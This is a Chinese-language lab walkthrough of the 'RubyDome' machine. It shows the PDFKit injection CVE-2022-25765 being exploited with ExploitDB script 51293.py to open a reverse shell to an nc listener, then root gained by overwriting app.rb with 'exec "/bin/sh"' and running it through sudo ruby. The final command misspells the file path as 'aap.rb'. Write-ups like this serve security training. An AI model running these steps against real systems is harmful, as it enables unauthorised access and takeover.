---
description: Linux - Easy：PDFKit
---

# ✔️ RubyDome

## 建立立足点

### 信息枚举

使用Nmap进行开放端口扫描，获得2个开放端口：22和3000

<figure><img src="../.gitbook/assets/1 (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
本例的“兔子洞”：

<img src="../.gitbook/assets/3 (2).png" alt="" data-size="original">
{% endhint %}

查看3000端口上的Web页面，发现目标是一个可将HTML页面转换为PDF格式的应用：

<figure><img src="../.gitbook/assets/2 (2).png" alt=""><figcaption></figcaption></figure>

尝试随意输入一个URL（http://127.0.0.1），来触发目标应用抛出错误信息，以进一步收集信息：

<figure><img src="../.gitbook/assets/4 (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/5 (2).png" alt=""><figcaption></figcaption></figure>

### 漏洞查找

查找关于PDFKit相关的已知、公开漏洞，得到：

<figure><img src="../.gitbook/assets/6 (2).png" alt=""><figcaption></figcaption></figure>

本例中，虽为从错误信息中看到任何版本号，但是从初步查找到的公开漏洞的描述信息可得知CVE-2022-25765是针对PDFKit 0.0.0到0.8.7.2版本都适用的，因此可以尝试。

<figure><img src="../.gitbook/assets/7 (2).png" alt=""><figcaption></figcaption></figure>

### 漏洞利用

```bash
// 在ExploitDB中查找利用脚本：
searchsploit PDFKit
// 下载利用脚本到Kali本地：
searchsploit -m 51293.py .
```

<figure><img src="../.gitbook/assets/8 (2).png" alt=""><figcaption></figcaption></figure>

查看该脚本的使用方法，供后续构造命令：

<figure><img src="../.gitbook/assets/10 (2).png" alt=""><figcaption></figcaption></figure>

* 参数 -s：设置Kali本机IP和监听的端口
* 参数 -w：设置目标地址和路径（查看目标页面的HTML源码）
* 参数 -p：设置POST的具体参数（查看目标页面的HTML源码）

<figure><img src="../.gitbook/assets/9 (2).png" alt=""><figcaption></figcaption></figure>

### GET SHELL

```bash
// 在Kali上监听端口：
nc -lvnp 4444
// 在Kali中运行利用脚本：
python3 51293.py -s 192.168.45.234 4444 -w http://192.168.225.22:3000/pdf -p url
```

<figure><img src="../.gitbook/assets/11 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/12 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## 提升权限

### 本地信息枚举

针对本机进行初步的信息枚举：

```bash
// 简单枚举，若无收获就换工具：
uname -a
find / -perm -u=s -type f 2>/dev/null
sudo -l
```

<figure><img src="../.gitbook/assets/13 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/14 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 漏洞查找

通过查找目标系统上所有由root用户拥有且设置了SUID位的普通文件，和查看当前用户andrew不需要密码就可以执行的文件/命令，可得出：**当前用户可以在无需密码的情况下，使用sudo ruby来运行app.rb文件**

<figure><img src="../.gitbook/assets/15 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

在GTFOBINS 发现可以使用 ruby​​ 获取 shell。

### 漏洞利用

进入到app.rb文件所在的文件夹，查看其权限，可得知当前用户andrew有权写入文件内容：

<figure><img src="../.gitbook/assets/16 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

在写入payload之前，先备份一个app.rb.bak文件，再写入payload：

```bash
// 备份:
cp app.rb app.rb.bak
// 写入payload:
echo 'exec "/bin/sh"' > app.rb
```

<figure><img src="../.gitbook/assets/17 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### ROOT

```bash
// 用sudo和ruby运行已重新修改的app.rb文件：
sudo /usr/bin/ruby /home/andrew/app/aap.rb
```

<figure><img src="../.gitbook/assets/18 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/19 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

